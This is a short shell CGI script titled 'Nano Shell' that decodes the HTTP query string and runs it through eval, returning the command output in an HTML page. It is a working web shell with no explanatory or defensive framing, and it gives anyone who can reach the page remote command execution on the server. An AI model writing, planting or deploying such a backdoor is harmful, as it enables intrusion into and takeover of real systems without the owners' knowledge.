#!/bin/sh

echo -en "Content-Type: text/html\r\n\r\n"

cat << EOF
<html>
  <head>
    <title>Nano Shell</title>
  </head>
  <body>
    <h2>Nano Shell</h2>
    <pre style="background: #ffffbb">$(
	cmd=$(eval "/usr/sbin/httpd -d '$QUERY_STRING'")
	echo -n "<b>$cmd</b><hr>"
	eval "exec 3>&-; exec 4>&-; ($cmd) 2>&1"
    )</pre>
    done
  </body>
</html>
EOF
